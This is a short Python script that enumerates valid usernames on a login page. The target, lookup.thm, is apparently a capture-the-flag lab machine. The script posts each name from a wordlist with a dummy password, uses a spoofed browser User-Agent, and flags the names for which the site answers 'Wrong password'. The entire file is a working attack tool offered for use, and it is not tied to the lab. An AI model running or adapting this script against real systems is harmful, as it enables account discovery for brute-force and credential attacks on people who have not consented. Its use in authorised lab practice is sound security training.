import requests

# Target URL
url = "http://lookup.thm/login.php"

# Username list file
file_path = "/usr/share/seclists/Usernames/Names/names.txt"

# Custom headers (to mimic real browser behavior)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# Initiate a session for efficiency
session = requests.Session()
session.headers.update(headers)

# Load usernames and attempt logins
try:
    with open(file_path, "r", encoding="utf-8") as file:
        for username in map(str.strip, file):
            if not username:
                continue  # Skip empty lines

            data = {
                "username": username,
                "password": "password"  # Placeholder password
            }

            response = session.post(url, data=data)

            # Process response
            if "Wrong password" in response.text:
                print(f"\033[92m[+] Valid username found: {username}\033[0m")  # Green output
            elif "wrong username" in response.text:
                continue  # Skip silently

except FileNotFoundError:
    print(f"\033[91m[ERROR]\033[0m The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"\033[91m[ERROR]\033[0m HTTP request failed: {e}")
